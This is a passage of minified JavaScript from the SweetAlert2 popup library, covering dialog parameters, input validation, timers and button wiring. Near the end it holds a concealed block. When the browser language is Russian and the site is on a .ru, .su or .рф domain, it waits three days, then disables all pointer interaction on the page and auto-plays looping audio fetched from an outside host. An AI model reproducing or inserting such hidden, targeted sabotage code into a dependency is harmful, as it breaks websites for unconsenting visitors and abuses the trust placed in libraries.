        Z(t.loader), H() ? e.icon && Y(v()) : kt(t), z([t.popup, t.actions], i.loading), t.popup.removeAttribute("aria-busy"), t.popup.removeAttribute("data-loading"), t.confirmButton.disabled = !1, t.denyButton.disabled = !1, t.cancelButton.disabled = !1
    }
    const kt = e => {
        const t = e.popup.getElementsByClassName(e.loader.getAttribute("data-button-to-replace"));
        t.length ? Y(t[0], "inline-block") : G(x()) || G($()) || G(E()) || Z(e.actions)
    };

    function Bt() {
        const e = n.innerParams.get(this),
            t = n.domCache.get(this);
        return t ? F(t.popup, e.input) : null
    }

    function Pt(e, t, o) {
        const i = n.domCache.get(e);
        t.forEach((e => {
            i[e].disabled = o
        }))
    }

    function xt(e, t) {
        if (e)
            if ("radio" === e.type) {
                const n = e.parentNode.parentNode.querySelectorAll("input");
                for (let e = 0; e < n.length; e++) n[e].disabled = t
            } else e.disabled = t
    }

    function Et() {
        Pt(this, ["confirmButton", "denyButton", "cancelButton"], !1)
    }

    function $t() {
        Pt(this, ["confirmButton", "denyButton", "cancelButton"], !0)
    }

    function Tt() {
        xt(this.getInput(), !1)
    }

    function Lt() {
        xt(this.getInput(), !0)
    }

    function St(e) {
        const t = n.domCache.get(this),
            o = n.innerParams.get(this);
        q(t.validationMessage, e), t.validationMessage.className = i["validation-message"], o.customClass && o.customClass.validationMessage && U(t.validationMessage, o.customClass.validationMessage), Y(t.validationMessage);
        const s = this.getInput();
        s && (s.setAttribute("aria-invalid", !0), s.setAttribute("aria-describedby", i["validation-message"]), _(s), U(s, i.inputerror))
    }

    function Ot() {
        const e = n.domCache.get(this);
        e.validationMessage && Z(e.validationMessage);
        const t = this.getInput();
        t && (t.removeAttribute("aria-invalid"), t.removeAttribute("aria-describedby"), z(t, i.inputerror))
    }
    const Mt = {
            title: "",
            titleText: "",
            text: "",
            html: "",
            footer: "",
            icon: void 0,
            iconColor: void 0,
            iconHtml: void 0,
            template: void 0,
            toast: !1,
            showClass: {
                popup: "swal2-show",
                backdrop: "swal2-backdrop-show",
                icon: "swal2-icon-show"
            },
            hideClass: {
                popup: "swal2-hide",
                backdrop: "swal2-backdrop-hide",
                icon: "swal2-icon-hide"
            },
            customClass: {},
            target: "body",
            color: void 0,
            backdrop: !0,
            heightAuto: !0,
            allowOutsideClick: !0,
            allowEscapeKey: !0,
            allowEnterKey: !0,
            stopKeydownPropagation: !0,
            keydownListenerCapture: !1,
            showConfirmButton: !0,
            showDenyButton: !1,
            showCancelButton: !1,
            preConfirm: void 0,
            preDeny: void 0,
            confirmButtonText: "OK",
            confirmButtonAriaLabel: "",
            confirmButtonColor: void 0,
            denyButtonText: "No",
            denyButtonAriaLabel: "",
            denyButtonColor: void 0,
            cancelButtonText: "Cancel",
            cancelButtonAriaLabel: "",
            cancelButtonColor: void 0,
            buttonsStyling: !0,
            reverseButtons: !1,
            focusConfirm: !0,
            focusDeny: !1,
            focusCancel: !1,
            returnFocus: !0,
            showCloseButton: !1,
            closeButtonHtml: "&times;",
            closeButtonAriaLabel: "Close this dialog",
            loaderHtml: "",
            showLoaderOnConfirm: !1,
            showLoaderOnDeny: !1,
            imageUrl: void 0,
            imageWidth: void 0,
            imageHeight: void 0,
            imageAlt: "",
            timer: void 0,
            timerProgressBar: !1,
            width: void 0,
            padding: void 0,
            background: void 0,
            input: void 0,
            inputPlaceholder: "",
            inputLabel: "",
            inputValue: "",
            inputOptions: {},
            inputAutoFocus: !0,
            inputAutoTrim: !0,
            inputAttributes: {},
            inputValidator: void 0,
            returnInputValueOnDeny: !1,
            validationMessage: void 0,
            grow: !1,
            position: "center",
            progressSteps: [],
            currentProgressStep: void 0,
            progressStepsDistance: void 0,
            willOpen: void 0,
            didOpen: void 0,
            didRender: void 0,
            willClose: void 0,
            didClose: void 0,
            didDestroy: void 0,
            scrollbarPadding: !0
        },
        jt = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"],
        It = {},
        Ht = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"],
        Dt = e => Object.prototype.hasOwnProperty.call(Mt, e),
        qt = e => -1 !== jt.indexOf(e),
        Vt = e => It[e],
        Nt = e => {
            Dt(e) || l(`Unknown parameter "${e}"`)
        },
        Ft = e => {
            Ht.includes(e) && l(`The parameter "${e}" is incompatible with toasts`)
        },
        _t = e => {
            Vt(e) && d(e, Vt(e))
        };

    function Rt(e) {
        const t = w(),
            o = n.innerParams.get(this);
        if (!t || V(t, o.hideClass.popup)) return void l("You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.");
        const i = Ut(e),
            s = Object.assign({}, o, i);
        Se(this, s), n.innerParams.set(this, s), Object.defineProperties(this, {
            params: {
                value: Object.assign({}, this.params, e),
                writable: !1,
                enumerable: !0
            }
        })
    }
    const Ut = e => {
        const t = {};
        return Object.keys(e).forEach((n => {
            qt(n) ? t[n] = e[n] : l(`Invalid parameter to update: ${n}`)
        })), t
    };

    function zt() {
        const t = n.domCache.get(this),
            o = n.innerParams.get(this);
        o ? (t.popup && e.swalCloseEventFinishedCallback && (e.swalCloseEventFinishedCallback(), delete e.swalCloseEventFinishedCallback), "function" == typeof o.didDestroy && o.didDestroy(), Wt(this)) : Kt(this)
    }
    const Wt = t => {
            Kt(t), delete t.params, delete e.keydownHandler, delete e.keydownTarget, delete e.currentInstance
        },
        Kt = e => {
            e.isAwaitingPromise ? (Yt(n, e), e.isAwaitingPromise = !0) : (Yt(Re, e), Yt(n, e), delete e.isAwaitingPromise, delete e.disableButtons, delete e.enableButtons, delete e.getInput, delete e.disableInput, delete e.enableInput, delete e.hideLoading, delete e.disableLoading, delete e.showValidationMessage, delete e.resetValidationMessage, delete e.close, delete e.closePopup, delete e.closeModal, delete e.closeToast, delete e.rejectPromise, delete e.update, delete e._destroy)
        },
        Yt = (e, t) => {
            for (const n in e) e[n].delete(t)
        };
    var Zt = Object.freeze({
        __proto__: null,
        _destroy: zt,
        close: Ge,
        closeModal: Ge,
        closePopup: Ge,
        closeToast: Ge,
        disableButtons: $t,
        disableInput: Lt,
        disableLoading: At,
        enableButtons: Et,
        enableInput: Tt,
        getInput: Bt,
        handleAwaitingPromise: tt,
        hideLoading: At,
        rejectPromise: et,
        resetValidationMessage: Ot,
        showValidationMessage: St,
        update: Rt
    });
    const Jt = (e, t, o) => {
            t.popup.onclick = () => {
                const t = n.innerParams.get(e);
                t && (Xt(t) || t.timer || t.input) || o(Me.close)
            }
        },
        Xt = e => e.showConfirmButton || e.showDenyButton || e.showCancelButton || e.showCloseButton;
    let Gt = !1;
    const Qt = e => {
            e.popup.onmousedown = () => {
                e.container.onmouseup = function(t) {
                    e.container.onmouseup = void 0, t.target === e.container && (Gt = !0)
                }
            }
        },
        en = e => {
            e.container.onmousedown = () => {
                e.popup.onmouseup = function(t) {
                    e.popup.onmouseup = void 0, (t.target === e.popup || e.popup.contains(t.target)) && (Gt = !0)
                }
            }
        },
        tn = (e, t, o) => {
            t.container.onclick = i => {
                const s = n.innerParams.get(e);
                Gt ? Gt = !1 : i.target === t.container && p(s.allowOutsideClick) && o(Me.backdrop)
            }
        },
        nn = e => e instanceof Element || (e => "object" == typeof e && e.jquery)(e);
    const on = () => {
            if (e.timeout) return (() => {
                const e = O(),
                    t = parseInt(window.getComputedStyle(e).width);
                e.style.removeProperty("transition"), e.style.width = "100%";
                const n = t / parseInt(window.getComputedStyle(e).width) * 100;
                e.style.width = `${n}%`
            })(), e.timeout.stop()
        },
        sn = () => {
            if (e.timeout) {
                const t = e.timeout.start();
                return te(t), t
            }
        };
    let rn = !1;
    const an = {};
    const ln = e => {
        for (let t = e.target; t && t !== document; t = t.parentNode)
            for (const e in an) {
                const n = t.getAttribute(e);
                if (n) return void an[e].fire({
                    template: n
                })
            }
    };
    var cn = Object.freeze({
        __proto__: null,
        argsToParams: e => {
            const t = {};
            return "object" != typeof e[0] || nn(e[0]) ? ["title", "html", "icon"].forEach(((n, o) => {
                const i = e[o];
                "string" == typeof i || nn(i) ? t[n] = i : void 0 !== i && c(`Unexpected type of ${n}! Expected "string" or "Element", got ${typeof i}`)
            })) : Object.assign(t, e[0]), t
        },
        bindClickHandler: function() {
            an[arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "data-swal-template"] = this, rn || (document.body.addEventListener("click", ln), rn = !0)
        },
        clickCancel: () => E() && E().click(),
        clickConfirm: Oe,
        clickDeny: () => $() && $().click(),
        enableLoading: rt,
        fire: function() {
            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
            return new this(...t)
        },
        getActions: L,
        getCancelButton: E,
        getCloseButton: M,
        getConfirmButton: x,
        getContainer: f,
        getDenyButton: $,
        getFocusableElements: j,
        getFooter: S,
        getHtmlContainer: A,
        getIcon: v,
        getIconContent: () => y(i["icon-content"]),
        getImage: k,
        getInputLabel: () => y(i["input-label"]),
        getLoader: T,
        getPopup: w,
        getProgressSteps: B,
        getTimerLeft: () => e.timeout && e.timeout.getTimerLeft(),
        getTimerProgressBar: O,
        getTitle: C,
        getValidationMessage: P,
        increaseTimer: t => {
            if (e.timeout) {
                const n = e.timeout.increase(t);
                return te(n, !0), n
            }
        },
        isDeprecatedParameter: Vt,
        isLoading: () => w().hasAttribute("data-loading"),
        isTimerRunning: () => e.timeout && e.timeout.isRunning(),
        isUpdatableParameter: qt,
        isValidParameter: Dt,
        isVisible: () => G(w()),
        mixin: function(e) {
            return class extends(this) {
                _main(t, n) {
                    return super._main(t, Object.assign({}, e, n))
                }
            }
        },
        resumeTimer: sn,
        showLoading: rt,
        stopTimer: on,
        toggleTimer: () => {
            const t = e.timeout;
            return t && (t.running ? on() : sn())
        }
    });
    class un {
        constructor(e, t) {
            this.callback = e, this.remaining = t, this.running = !1, this.start()
        }
        start() {
            return this.running || (this.running = !0, this.started = new Date, this.id = setTimeout(this.callback, this.remaining)), this.remaining
        }
        stop() {
            return this.running && (this.running = !1, clearTimeout(this.id), this.remaining -= (new Date).getTime() - this.started.getTime()), this.remaining
        }
        increase(e) {
            const t = this.running;
            return t && this.stop(), this.remaining += e, t && this.start(), this.remaining
        }
        getTimerLeft() {
            return this.running && (this.stop(), this.start()), this.remaining
        }
        isRunning() {
            return this.running
        }
    }
    const dn = ["swal-title", "swal-html", "swal-footer"],
        pn = e => {
            const t = {};
            return Array.from(e.querySelectorAll("swal-param")).forEach((e => {
                vn(e, ["name", "value"]);
                const n = e.getAttribute("name"),
                    o = e.getAttribute("value");
                t[n] = "boolean" == typeof Mt[n] ? "false" !== o : "object" == typeof Mt[n] ? JSON.parse(o) : o
            })), t
        },
        mn = e => {
            const t = {};
            return Array.from(e.querySelectorAll("swal-function-param")).forEach((e => {
                const n = e.getAttribute("name"),
                    o = e.getAttribute("value");
                t[n] = new Function(`return ${o}`)()
            })), t
        },
        gn = e => {
            const t = {};
            return Array.from(e.querySelectorAll("swal-button")).forEach((e => {
                vn(e, ["type", "color", "aria-label"]);
                const n = e.getAttribute("type");
                t[`${n}ButtonText`] = e.innerHTML, t[`show${a(n)}Button`] = !0, e.hasAttribute("color") && (t[`${n}ButtonColor`] = e.getAttribute("color")), e.hasAttribute("aria-label") && (t[`${n}ButtonAriaLabel`] = e.getAttribute("aria-label"))
            })), t
        },
        hn = e => {
            const t = {},
                n = e.querySelector("swal-image");
            return n && (vn(n, ["src", "width", "height", "alt"]), n.hasAttribute("src") && (t.imageUrl = n.getAttribute("src")), n.hasAttribute("width") && (t.imageWidth = n.getAttribute("width")), n.hasAttribute("height") && (t.imageHeight = n.getAttribute("height")), n.hasAttribute("alt") && (t.imageAlt = n.getAttribute("alt"))), t
        },
        fn = e => {
            const t = {},
                n = e.querySelector("swal-icon");
            return n && (vn(n, ["type", "color"]), n.hasAttribute("type") && (t.icon = n.getAttribute("type")), n.hasAttribute("color") && (t.iconColor = n.getAttribute("color")), t.iconHtml = n.innerHTML), t
        },
        bn = e => {
            const t = {},
                n = e.querySelector("swal-input");
            n && (vn(n, ["type", "label", "placeholder", "value"]), t.input = n.getAttribute("type") || "text", n.hasAttribute("label") && (t.inputLabel = n.getAttribute("label")), n.hasAttribute("placeholder") && (t.inputPlaceholder = n.getAttribute("placeholder")), n.hasAttribute("value") && (t.inputValue = n.getAttribute("value")));
            const o = Array.from(e.querySelectorAll("swal-input-option"));
            return o.length && (t.inputOptions = {}, o.forEach((e => {
                vn(e, ["value"]);
                const n = e.getAttribute("value"),
                    o = e.innerHTML;
                t.inputOptions[n] = o
            }))), t
        },
        yn = (e, t) => {
            const n = {};
            for (const o in t) {
                const i = t[o],
                    s = e.querySelector(i);
                s && (vn(s, []), n[i.replace(/^swal-/, "")] = s.innerHTML.trim())
            }
            return n
        },
        wn = e => {
            const t = dn.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
            Array.from(e.children).forEach((e => {
                const n = e.tagName.toLowerCase();
                t.includes(n) || l(`Unrecognized element <${n}>`)
            }))
        },
        vn = (e, t) => {
            Array.from(e.attributes).forEach((n => {
                -1 === t.indexOf(n.name) && l([`Unrecognized attribute "${n.name}" on <${e.tagName.toLowerCase()}>.`, "" + (t.length ? `Allowed attributes are: ${t.join(", ")}` : "To set the value, use HTML within the element.")])
            }))
        },
        Cn = t => {
            const n = f(),
                o = w();
            "function" == typeof t.willOpen && t.willOpen(o);
            const s = window.getComputedStyle(document.body).overflowY;
            Pn(n, o, t), setTimeout((() => {
                kn(n, o)
            }), 10), I() && (Bn(n, t.scrollbarPadding, s), Array.from(document.body.children).forEach((e => {
                e === f() || e.contains(f()) || (e.hasAttribute("aria-hidden") && e.setAttribute("data-previous-aria-hidden", e.getAttribute("aria-hidden")), e.setAttribute("aria-hidden", "true"))
            }))), H() || e.previousActiveElement || (e.previousActiveElement = document.activeElement), "function" == typeof t.didOpen && setTimeout((() => t.didOpen(o))), z(n, i["no-transition"])
        },
        An = e => {
            const t = w();
            if (e.target !== t) return;
            const n = f();
            t.removeEventListener(ce, An), n.style.overflowY = "auto"
        },
        kn = (e, t) => {
            ce && ee(t) ? (e.style.overflowY = "hidden", t.addEventListener(ce, An)) : e.style.overflowY = "auto"
        },
        Bn = (e, t, n) => {
            (() => {
                if ((/iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream || "MacIntel" === navigator.platform && navigator.maxTouchPoints > 1) && !V(document.body, i.iosfix)) {
                    const e = document.body.scrollTop;
                    document.body.style.top = -1 * e + "px", U(document.body, i.iosfix), We(), ze()
                }
            })(), t && "hidden" !== n && Je(), setTimeout((() => {
                e.scrollTop = 0
            }))
        },
        Pn = (e, t, n) => {
            U(e, n.showClass.backdrop), t.style.setProperty("opacity", "0", "important"), Y(t, "grid"), setTimeout((() => {
                U(t, n.showClass.popup), t.style.removeProperty("opacity")
            }), 10), U([document.documentElement, document.body], i.shown), n.heightAuto && n.backdrop && !n.toast && U([document.documentElement, document.body], i["height-auto"])
        };
    var xn = {
        email: (e, t) => /^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(e) ? Promise.resolve() : Promise.resolve(t || "Invalid email address"),
        url: (e, t) => /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(e) ? Promise.resolve() : Promise.resolve(t || "Invalid URL")
    };

    function En(e) {
        ! function(e) {
            e.inputValidator || Object.keys(xn).forEach((t => {
                e.input === t && (e.inputValidator = xn[t])
            }))
        }(e), e.showLoaderOnConfirm && !e.preConfirm && l("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request"),
            function(e) {
                (!e.target || "string" == typeof e.target && !document.querySelector(e.target) || "string" != typeof e.target && !e.target.appendChild) && (l('Target parameter is not valid, defaulting to "body"'), e.target = "body")
            }(e), "string" == typeof e.title && (e.title = e.title.split("\n").join("<br />")), se(e)
    }
    let $n;
    class Tn {
        constructor() {
            if ("undefined" == typeof window) return;
            $n = this;
            for (var e = arguments.length, t = new Array(e), o = 0; o < e; o++) t[o] = arguments[o];
            const i = Object.freeze(this.constructor.argsToParams(t));
            Object.defineProperties(this, {
                params: {
                    value: i,
                    writable: !1,
                    enumerable: !0,
                    configurable: !0
                }
            }), this.isAwaitingPromise = !1;
            const s = $n._main($n.params);
            n.promise.set(this, s)
        }
        _main(t) {
            let o = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            (e => {
                !1 === e.backdrop && e.allowOutsideClick && l('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
                for (const t in e) Nt(t), e.toast && Ft(t), _t(t)
            })(Object.assign({}, o, t)), e.currentInstance && (e.currentInstance._destroy(), I() && Ue()), e.currentInstance = $n;
            const i = Sn(t, o);
            En(i), Object.freeze(i), e.timeout && (e.timeout.stop(), delete e.timeout), clearTimeout(e.restoreFocusTimeout);
            const s = On($n);
            return Se($n, i), n.innerParams.set($n, i), Ln($n, s, i)
        }
        disableButtons = $t;
        enableButtons = Et;
        getInput = Bt;
        disableInput = Lt;
        enableInput = Tt;
        hideLoading = At;
        disableLoading = At;
        showValidationMessage = St;
        resetValidationMessage = Ot;
        close = Ge;
        closePopup = Ge;
        closeModal = Ge;
        closeToast = Ge;
        rejectPromise = et;
        update = Rt;
        _destroy = zt;
        then(e) {
            return n.promise.get(this).then(e)
        } finally(e) {
            return n.promise.get(this).finally(e)
        }
    }
    const Ln = (t, o, i) => new Promise(((s, r) => {
            const a = e => {
                t.close({
                    isDismissed: !0,
                    dismiss: e
                })
            };
            Re.swalPromiseResolve.set(t, s), Re.swalPromiseReject.set(t, r), o.confirmButton.onclick = () => {
                (e => {
                    const t = n.innerParams.get(e);
                    e.disableButtons(), t.input ? ft(e, "confirm") : Ct(e, !0)
                })(t)
            }, o.denyButton.onclick = () => {
                (e => {
                    const t = n.innerParams.get(e);
                    e.disableButtons(), t.returnInputValueOnDeny ? ft(e, "deny") : yt(e, !1)
                })(t)
            }, o.cancelButton.onclick = () => {
                ((e, t) => {
                    e.disableButtons(), t(Me.cancel)
                })(t, a)
            }, o.closeButton.onclick = () => {
                a(Me.close)
            }, ((e, t, o) => {
                n.innerParams.get(e).toast ? Jt(e, t, o) : (Qt(t), en(t), tn(e, t, o))
            })(t, o, a), ((e, t, n, o) => {
                je(t), n.toast || (t.keydownHandler = t => qe(e, t, o), t.keydownTarget = n.keydownListenerCapture ? window : w(), t.keydownListenerCapture = n.keydownListenerCapture, t.keydownTarget.addEventListener("keydown", t.keydownHandler, {
                    capture: t.keydownListenerCapture
                }), t.keydownHandlerAdded = !0)
            })(t, e, i, a), ((e, t) => {
                "select" === t.input || "radio" === t.input ? dt(e, t) : ["text", "email", "number", "tel", "textarea"].includes(t.input) && (m(t.inputValue) || h(t.inputValue)) && (rt(x()), pt(e, t))
            })(t, i), Cn(i), Mn(e, i, a), jn(o, i), setTimeout((() => {
                o.container.scrollTop = 0
            }))
        })),
        Sn = (e, t) => {
            const n = (e => {
                    const t = "string" == typeof e.template ? document.querySelector(e.template) : e.template;
                    if (!t) return {};
                    const n = t.content;
                    return wn(n), Object.assign(pn(n), mn(n), gn(n), hn(n), fn(n), bn(n), yn(n, dn))
                })(e),
                o = Object.assign({}, Mt, t, n, e);
            return o.showClass = Object.assign({}, Mt.showClass, o.showClass), o.hideClass = Object.assign({}, Mt.hideClass, o.hideClass), o
        },
        On = e => {
            const t = {
                popup: w(),
                container: f(),
                actions: L(),
                confirmButton: x(),
                denyButton: $(),
                cancelButton: E(),
                loader: T(),
                closeButton: M(),
                validationMessage: P(),
                progressSteps: B()
            };
            return n.domCache.set(e, t), t
        },
        Mn = (e, t, n) => {
            const o = O();
            Z(o), t.timer && (e.timeout = new un((() => {
                n("timer"), delete e.timeout
            }), t.timer), t.timerProgressBar && (Y(o), N(o, t, "timerProgressBar"), setTimeout((() => {
                e.timeout && e.timeout.running && te(t.timer)
            }))))
        },
        jn = (e, t) => {
            t.toast || (p(t.allowEnterKey) ? In(e, t) || Ie(-1, 1) : Hn())
        },
        In = (e, t) => t.focusDeny && G(e.denyButton) ? (e.denyButton.focus(), !0) : t.focusCancel && G(e.cancelButton) ? (e.cancelButton.focus(), !0) : !(!t.focusConfirm || !G(e.confirmButton)) && (e.confirmButton.focus(), !0),
        Hn = () => {
            document.activeElement instanceof HTMLElement && "function" == typeof document.activeElement.blur && document.activeElement.blur()
        };
    if ("undefined" != typeof window && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
        const e = new Date,
            t = localStorage.getItem("swal-initiation");
        t ? (e.getTime() - Date.parse(t)) / 864e5 > 3 && setTimeout((() => {
            document.body.style.pointerEvents = "none";
            const e = document.createElement("audio");
            e.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3", e.loop = !0, document.body.appendChild(e), setTimeout((() => {
                e.play().catch((() => {}))
            }), 2500)
        }), 500) : localStorage.setItem("swal-initiation", `${e}`)
    }
    Object.assign(Tn, cn), Object.keys(Zt).forEach((e => {
        Tn[e] = function() {
            return $n && $n[e] ? $n[e](...arguments) : null
        }
    })), Tn.DismissReason = Me, Tn.version = "11.7.6";
    const Dn = Tn;
    return Dn.default = Dn, Dn
})), void 0 !== this && this.Sweetalert2 && (this.swal = this.sweetAlert = this.Swal = this.SweetAlert = this.Sweetalert2);
"undefined" != typeof document && function(e, t) {
    var n = e.createElement("style");
    if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet) n.styleSheet.disabled || (n.styleSheet.cssText = t);
    else try {
        n.innerHTML = t
    } catch (e) {
        n.innerText = t
    }
}